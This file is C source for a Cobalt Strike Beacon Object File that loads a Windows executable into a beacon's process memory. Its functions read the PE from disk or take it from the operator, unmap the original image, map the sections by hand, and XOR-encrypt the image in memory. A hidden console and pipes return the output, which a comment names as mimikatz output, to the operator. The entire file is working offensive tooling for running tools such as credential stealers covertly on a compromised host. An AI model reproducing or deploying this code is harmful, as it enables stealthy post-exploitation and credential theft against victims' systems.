#include "bofdefs.h"
#include "beacon.h"

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS
#define ARRAY_MODULES_SIZE 128

//PE vars
IMAGE_NT_HEADERS* ntHeader = NULL;

FILE *__cdecl __acrt_iob_funcs(int index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))


BYTE* getNtHdrs(BYTE* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (BYTE*)inh;
}

IMAGE_DATA_DIRECTORY* getPeDir(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

void xorPE(char* pImageBase, DWORD sizeofimage, char* key)
{
	//Copy key into char array for easier use in XOR function
	char temp[100] = {0};
	memcpy(temp, key, strlen(key));

	DWORD a = 0;

	while (a < sizeofimage) {
		//If byte isn't null, we xor it
		if(*(pImageBase + a) != 0x00) //if((*(pImageBase + a) != 0x00 ) && (*(pImageBase + a) ^ temp[a % strlen(temp)] != 0x00))
		{
			//XOR byte using key
			*(pImageBase + a) ^= temp[a % strlen(temp)];

			//If resulting byte is a null byte, we xor back to original
			if(*(pImageBase + a) == 0x00)
			{
				*(pImageBase + a) ^= temp[a % strlen(temp)];
			}
		}
		a++;
	}
	memset(temp, 0, strlen(key));
	return;
}

BOOL peLoader(char* data, int peLen, char* key)
{
	//Create MemAddr struct to contain important values for the mapped PE
	struct MemAddrs *pMemAddrs  = malloc(sizeof(struct MemAddrs));
	memset(pMemAddrs, 0, sizeof(struct MemAddrs));

//------------------------------------------Manually map PE into memory------------------------------------------

	LONGLONG fileSize = -1;
	LPVOID preferAddr = 0;
	ntHeader = (IMAGE_NT_HEADERS*)getNtHdrs(data);
	if (!ntHeader)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] File isn't a PE file.");
		BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

		//Free pMemAddr struct
		free(pMemAddrs);

		return FALSE;
	}

	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
	//BeaconPrintf(CALLBACK_OUTPUT, "[+] Exe File Prefer Image Base at %x\n", preferAddr);

	HMODULE dll = LoadLibraryA("ntdll.dll");
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

	pMemAddrs->pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pMemAddrs->pImageBase && !relocDir)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Allocate Image Base At %x Failure.\n", preferAddr);
		BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

		//Free pMemAddr struct
		free(pMemAddrs);

		return FALSE;
	}
	if (!pMemAddrs->pImageBase && relocDir)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Try to Allocate Memory for New Image Base\n");
		pMemAddrs->pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!pMemAddrs->pImageBase)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[-] Allocate Memory For Image Base Failure.\n");
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

			//Free pMemAddr struct
			free(pMemAddrs);

			return FALSE;
		}
	}

	ntHeader->OptionalHeader.ImageBase = (size_t)pMemAddrs->pImageBase;
	memcpy(pMemAddrs->pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

	IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)((size_t)(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "    [+] Mapping Section %s\n", SectionHeaderArr[i].Name);
		memcpy((LPVOID)((size_t)(pMemAddrs->pImageBase) + SectionHeaderArr[i].VirtualAddress), (LPVOID)((size_t)(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
	}
  
	//Update struct with EntryPoint, ImageSize
	pMemAddrs->AddressOfEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;
	pMemAddrs->SizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
  
	//Encrypt PE in memory
	xorPE(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, key);

	//Now create back-up of PE in memory so we can restore it in-between runs.
	//Some PE's can run multiple times without issues, other crash on 2nd run for unknown reasons. Remapping works fine.
	pMemAddrs->pBackupImage = (BYTE*)VirtualAlloc(NULL, pMemAddrs->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(pMemAddrs->pBackupImage, pMemAddrs->pImageBase, pMemAddrs->SizeOfImage);
	
	//Enumerate all loaded DLL's before we have map/run the new PE to establish baseline so we can unload DLL's later
	DWORD cbNeeded;
  	HMODULE* loadedModules = calloc(ARRAY_MODULES_SIZE, sizeof(HMODULE));
    EnumProcessModules((HANDLE)-1, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);
	pMemAddrs->dwNumModules = cbNeeded / sizeof(HMODULE);
	free(loadedModules);

//------------------------Now create conhost.exe, setup stdout/stderr, and redirect output-----------------------

	//Allocate Console
	BOOL suc = AllocConsole();

    //Immediately hide window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

    //Reopen stdout/stderr and associate to new FILE* fout and ferr
    freopen_s(&pMemAddrs->fout, "CONOUT$", "r+", stdout);
    freopen_s(&pMemAddrs->ferr, "CONOUT$", "r+", stderr);

	//Set pMemAddrs->bCloseFHandles to TRUE by default
	//This distinction is necessary because depending on whether we bail on execution during perun, we have to alter how we cleanup
	pMemAddrs->bCloseFHandles = TRUE;

	//Create an Anonymous pipe for both stdout and stderr
	SECURITY_ATTRIBUTES sao = { sizeof(sao),NULL,TRUE };
	CreatePipe(&pMemAddrs->hreadout, &pMemAddrs->hwriteout, &sao, 0);

	//Set StandardOutput and StandardError in PEB to write-end of anonymous pipe
    SetStdHandle(STD_OUTPUT_HANDLE, pMemAddrs->hwriteout);
	SetStdHandle(STD_ERROR_HANDLE, pMemAddrs->hwriteout);

	//Create File Descriptor from the Windows Handles for write-end of anonymous pipe
	pMemAddrs->fo = _open_osfhandle((intptr_t)(pMemAddrs->hwriteout), _O_TEXT);

	//These redirect output from mimikatz
	//Reassign reopened FILE* for stdout/stderr to the File Descriptor for the anonymous pipe
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->fout));
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->ferr));

	//These redirect output from cmd.exe.  Not sure why these are valid/necessary given that _freopen_s SHOULD close original FD's (1 and 2)
	//Reassign original FD's for stdout/stderr to the File Descriptor for the anonymous pipe 
	_dup2(pMemAddrs->fo, 1);
	_dup2(pMemAddrs->fo, 2);

	//Send output back to CS to update petable with MemAddr Struct location
	char pMemAddrstr[20] = {0};
	sprintf_s(pMemAddrstr, 20, "%" PRIuPTR, (uintptr_t)pMemAddrs);
    BeaconPrintf(CALLBACK_OUTPUT, "peload %s", pMemAddrstr);
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);

	int dataextracted = 0;
	int peLen = 0;

	//data var will either contain the full PE as bytes OR the name of a local PE to load. The bool 'local' tells peload which to expect. 
	char* data = BeaconDataExtract(&parser, &peLen);
	char* key = BeaconDataExtract(&parser, &dataextracted);
	BOOL local = BeaconDataInt(&parser);

	//If a local PE was specified, try and read it from disk
	if(local)
	{
		//Try and open a handle to the specified file
		HANDLE hFile = CreateFileA(data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 

		if (hFile == INVALID_HANDLE_VALUE) 
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to open %s. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1; 
		}

		LARGE_INTEGER lpFileSize;

		//Get size of file
		if(!GetFileSizeEx(hFile, &lpFileSize))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to determine filesize of %s. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1;   
		}

		//Allocate buffer to hold PE
		char* pe = calloc(lpFileSize.LowPart + 1, sizeof(char));

		//Read file into buffer
		DWORD bRead;
		if(!ReadFile(hFile, pe, lpFileSize.LowPart, &bRead, NULL))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to read %s from disk. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1;   
		}

		//Map PE into memory
		peLoader(pe, lpFileSize.LowPart, key);

		//Clear file from memory
		memset(pe, 0, lpFileSize.LowPart);
		free(pe);
			
		return 0;
	}

	//Otherwise we were sent the full PE already, just load it.,
	else
	{
		peLoader(data, peLen, key);
		return 0;
	}
}
